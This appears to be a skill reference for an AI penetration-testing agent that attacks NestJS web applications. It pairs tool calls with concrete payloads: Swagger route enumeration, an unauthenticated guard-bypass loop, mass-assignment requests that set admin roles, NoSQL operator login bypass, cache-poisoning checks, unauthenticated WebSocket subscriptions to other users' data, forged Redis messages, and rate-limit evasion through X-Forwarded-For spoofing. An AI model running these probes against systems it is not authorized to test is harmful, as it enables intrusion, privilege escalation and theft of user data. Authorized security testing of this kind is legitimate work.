---
name: NestJS
description: Reference for black-box testing NestJS apps covering Swagger mining, guard bypasses across decorator stacks, ValidationPipe gaps, multi-transport auth (HTTP/WS/microservice), serializer leaks, and ORM injection.
---

# NestJS

Reference for testing NestJS targets over their public surface: Swagger / OpenAPI, REST controllers, GraphQL resolvers, WebSocket gateways, microservice transports, and CRUD generators. Pull this in when you fingerprint Node + decorator-driven errors + the typical NestJS exception envelope.

> Black-box scope: probes drive HTTP, WebSocket, and the Swagger / OpenAPI schema. There is no source-code analysis step.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| HTTP probes | `execute_curl` | NestJS errors are JSON: `{"statusCode":..., "message":[...], "error":"..."}`. |
| Swagger fetch | `execute_curl` | `/api`, `/api-docs`, `/api-json`, `/swagger`, `/docs`. |
| Param brute | `execute_arjun` | Often finds shadowed DTO fields. |
| GraphQL resolvers | See `/skill graphql` | NestJS GraphQL is Apollo-flavored. |
| WebSocket | `execute_code` | socket.io vs `ws` adapter; both common. |
| Microservice transport probes | `execute_code` | Direct connect to Redis / NATS / Kafka if reachable. |

## Stack fingerprint

| Signal | Confirms |
|---|---|
| `server: nginx` + JSON error envelope `{"statusCode":401,"message":"Unauthorized"}` | NestJS default ExceptionFilter |
| Validation error: `"message":["email must be an email","password must be longer than 8"]` | `class-validator` via `ValidationPipe` |
| `x-powered-by: Express` or `Fastify` | NestJS HTTP adapter |
| `/api`, `/api-json`, `/swagger`, `/docs` reachable | `@nestjs/swagger` |
| `/graphql` reachable with Apollo Sandbox | `@nestjs/graphql` (Apollo) |
| socket.io path `/socket.io/` | NestJS WebSocket gateway with socket.io adapter |

## Reconnaissance

### Swagger / OpenAPI

```
execute_curl url: "https://target.tld/api"
execute_curl url: "https://target.tld/api-docs"
execute_curl url: "https://target.tld/api-json"
execute_curl url: "https://target.tld/swagger"
execute_curl url: "https://target.tld/docs"
execute_curl url: "https://target.tld/v1/api-docs"
execute_curl url: "https://target.tld/api/v2/docs"
```

Parse:

```
kali_shell: curl -s https://target.tld/api-json | jq -r '.paths | keys[]' | sort -u
kali_shell: curl -s https://target.tld/api-json | jq '.components.securitySchemes'
kali_shell: curl -s https://target.tld/api-json | jq -r '.paths | to_entries[] | "\(.key)\t\(.value | keys | join(","))"' | sort
```

### Auto-generated CRUD

`@nestjsx/crud`-style generators expose predictable filters / sort / join params. Probe:

```
?filter=is_admin||$eq||true
?join=user||email,role,internal_id
?sort=created_at,DESC
?or=role||$eq||admin
?limit=1000
```

### GraphQL (when present)

Apollo playground at `/graphql`. Run schema acquisition; see `/skill graphql`.

### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive this from the recorded history. `redamon.sitemap` enumerates the `/api/*` endpoints already seen, and `redamon.search {q:"api-json"}` (or `{bodyq:"securitySchemes"}`) locates a captured `/api-json` you can `redamon.get(id,"response")` for the Swagger path/security map. Drive each attack off a real captured request via `redamon.replay`: `dropHeaders:["Authorization"]` per endpoint to catch a guard that answers 200/403 instead of 401 (guard miss); inject extra DTO fields with a widened `body` (mass assignment under `whitelist` without `forbidNonWhitelisted`); `headers:{"X-HTTP-Method-Override":"DELETE"}` to swap the method before guards run; and `headers:{"Content-Type":"application/x-www-form-urlencoded"}` with a re-encoded body to dodge JSON-only validators. For `CacheInterceptor` poisoning, replay the same path once with the auth `Cookie`/`Authorization` and once with `dropHeaders:["Cookie","Authorization"]`, then `redamon.diff` the two responses: an identity-free cache serves User A's body to the anon caller. `redamon.params` surfaces shadowed params and `redamon.fuzz(id,"id",[...])` pollutes a single query param (loop `redamon.replay` for `?id=1&id=2`-style duplication or header/body positions). Caveats: `redamon.replay` is pinned to the origin host, and `proxy_brain` only see traffic that went through the capture proxy.

## Attack matrix

### Guard bypass

NestJS guards stack: global -> controller -> method. Drop sites:

| Pattern | Probe |
|---|---|
| Method missing `@UseGuards` when siblings have it | Hit each handler directly; compare auth behavior |
| `@Public()` decorator applied too broadly | Look for routes that should be authed but return 200 anon |
| Guard handles only HTTP context (`getRequest()`); fails open on WS / RPC | Send same operation via WebSocket / microservice |
| `Reflector.get()` reads wrong metadata key (`role` vs `roles`) | Token without role claims still authorized |
| `applyDecorators()` composition order swallowing stricter guard | Compare similar routes; one will be unguarded |

```
# Anon probe of each /api/* endpoint enumerated from Swagger
for path in $(curl -s https://target.tld/api-json | jq -r '.paths | keys[]'); do
  echo "$path"
  curl -s -o /dev/null -w "%{http_code}\n" "https://target.tld${path}"
done
```

Anything answering 200 / 403 instead of 401 (when Swagger says it requires bearer auth) is a guard miss.

### ValidationPipe gaps

| Missing config | Probe outcome |
|---|---|
| `whitelist:true` without `forbidNonWhitelisted:true` | Extra props silently stripped after middleware/interceptors saw them |
| `@ValidateNested()` without `@Type(() => ChildDto)` | Nested object never validated |
| `@IsArray()` without `@ValidateNested({each:true})` and `@Type` | Array elements unvalidated |
| `transform:true` | String -> number / `"true"` -> boolean coercion bugs |
| `@ValidateIf()` / groups | Validation skipped on certain payload shapes |
| Missing `ParseIntPipe` / `ParseUUIDPipe` on `@Param('id')` | String values reach ORM directly |

```
# Inject extra fields under whitelist:true (no forbidNonWhitelisted)
execute_curl url: "https://target.tld/api/users" method: "POST" headers: "Authorization: Bearer $TOKEN_A\nContent-Type: application/json" data: '{"email":"x@x","password":"P@ssw0rd1!","role":"admin","tenantId":"OTHER","is_admin":true}'

# Type coercion abuse
execute_curl url: "https://target.tld/api/quota" method: "POST" headers: "Authorization: Bearer $TOKEN_A\nContent-Type: application/json" data: '{"limit":"-1","plan":"true"}'

# Array element bypass
execute_curl url: "https://target.tld/api/teams/123/members" method: "POST" headers: "Authorization: Bearer $TOKEN_A\nContent-Type: application/json" data: '{"members":[{"role":"owner","userId":"FOREIGN"}]}'
```

### JWT / Passport

NestJS uses `@nestjs/passport` + `@nestjs/jwt`. Common gaps:

- `ignoreExpiration: true` left on
- `algorithms` not pinned (allows `none` or RS/HS confusion)
- Weak `secretOrKey`
- `validate()` returns full DB record -> sensitive fields leak in `req.user` and downstream serialization

Pivot to `/skill jwt_attacks` for the algorithm-confusion matrix.

### Serialization leaks

Without `ClassSerializerInterceptor` enabled globally, fields decorated `@Exclude()` get serialized.

```
# Probe for password / hash / internal IDs in any user response
execute_curl url: "https://target.tld/api/users/me" headers: "Authorization: Bearer $TOKEN_A"
# Expect: only displayable fields. If you see password_hash, mfa_secret, refresh_token_hash, internal_id -> serializer missing
```

Eager-loaded TypeORM / Prisma relations expand object graphs. Endpoints returning `{user: {orders: [{items: [{...}]}]}}` rarely sanitize correctly.

### Interceptor cache poisoning

`CacheInterceptor` without identity in the cache key serves one user's response to another.

```
# Send authed request as User A; observe response
# Send anon or User B request to the same path; if response matches User A's, cache lacks identity
execute_curl url: "https://target.tld/api/profile" headers: "Authorization: Bearer $TOKEN_A"
sleep 2
execute_curl url: "https://target.tld/api/profile"
```

### Module boundary leaks

`@Global()` modules expose providers everywhere. The black-box symptom: an internal service (e.g. `/admin/internal/...`) is callable from a context that should not have access. Probe via Swagger surface diff (paths under `/internal/` or `/admin/` with no auth scheme listed).

### WebSocket

HTTP guards do NOT auto-apply to WS. Common gaps:

```
execute_code language: python
import asyncio, websockets, json
async def go():
    async with websockets.connect("wss://target.tld/ws") as ws:
        # If connect succeeds without auth, per-message check is the only barrier
        await ws.send(json.dumps({"event":"subscribe","data":{"topic":"orders:OTHER_USER"}}))
        for _ in range(20):
            print(await ws.recv())
asyncio.run(go())
```

For socket.io:

```
execute_code language: python
# Use python-socketio
import socketio
sio = socketio.Client()
sio.connect("https://target.tld", socketio_path="/socket.io")
sio.emit("subscribe", {"room": "admin"})
sio.wait()
```

Probes:

- Authentication deferred from `handleConnection` to message handlers -> connect anon, attempt commands.
- Per-message auth missing -> capture an authenticated session cookie/token, replay across rooms.
- Cross-room join via filter args.

### Microservice transport

`@MessagePattern` / `@EventPattern` handlers often skip guards. If the underlying transport (Redis pub/sub, NATS, Kafka, MQTT) is reachable from the test position:

```
# Redis pub/sub example
execute_code language: python
import redis
r = redis.Redis(host="redis.target.tld", port=6379)
r.publish("orders.create", '{"userId":"FOREIGN","amount":-1}')
```

Treat as critical when the transport is network-reachable; messages bypass every HTTP guard.

### ORM injection

| ORM | Vector |
|---|---|
| TypeORM `QueryBuilder` / `.query()` | Template-literal interpolation -> SQL injection |
| TypeORM `relations` | API exposing `relations` query param -> load arbitrary relations |
| Mongoose | Operator injection via JSON body: `{"password":{"$gt":""}}` |
| Mongoose | `$where` / `$regex` from user input |
| Prisma | `$queryRaw` / `$executeRaw` with string interpolation, `$queryRawUnsafe` |

NoSQL operator injection (login bypass on Mongoose):

```
execute_curl url: "https://target.tld/api/login" method: "POST" headers: "Content-Type: application/json" data: '{"email":"admin@target.tld","password":{"$ne":""}}'
```

### Rate limiting

`@nestjs/throttler` + `@SkipThrottle()`:

```
# Abuse @SkipThrottle on auth endpoints
execute_curl url: "https://target.tld/auth/login" method: "POST" data: '{"email":"a","password":"P1"}'
# repeat at high rate; if no 429 ever, throttler is missing or skipped
```

Behind a proxy without `trust proxy`, all requests share the proxy IP -> single counter for the world. Spoof `X-Forwarded-For` to test.

### Versioning skews

NestJS supports URI / Header / MediaType versioning. v1 of an endpoint may still be live without the new guard added in v2.

```
GET /v1/admin/users        # returns 200 (legacy)
GET /v2/admin/users        # returns 403 (current)
GET /admin/users           # returns ?
```

## Bypass techniques summary

- Param pollution (`?id=1&id=2`) where guards read first and handler reads array.
- Method override (`X-HTTP-Method-Override: DELETE`) processed by Express before guards.
- Content-type switching (`x-www-form-urlencoded` instead of JSON) to dodge JSON-only validators.
- Composed `@Public()` decorator at method level disabling global guard.
- Mounted subapps (admin UI, static, metrics) with their own pipeline.

## Validation shape

A clean NestJS finding includes:

1. Stack fingerprint (NestJS + transport + ORM, where leaked).
2. Swagger / OpenAPI definition or its absence (for hidden-route findings).
3. Decorator-stack hypothesis named explicitly (`@UseGuards(JwtAuthGuard)` missing on `POST /api/users`, controller had it on `GET`).
4. Side-by-side requests proving the gap.
5. For ORM injection: a deterministic differential (timing or content) and a minimal reproducer.

## Hand-off

```
JWT / Passport gaps   -> /skill jwt_attacks
OAuth flows           -> /skill oauth_oidc
GraphQL resolvers     -> /skill graphql
ORM SQL injection     -> built-in sql_injection
NoSQL operator injection -> dedicated NoSQL skill (when shipped) + execute_code
Microservice messages -> escalate to operator before crafting payload
```
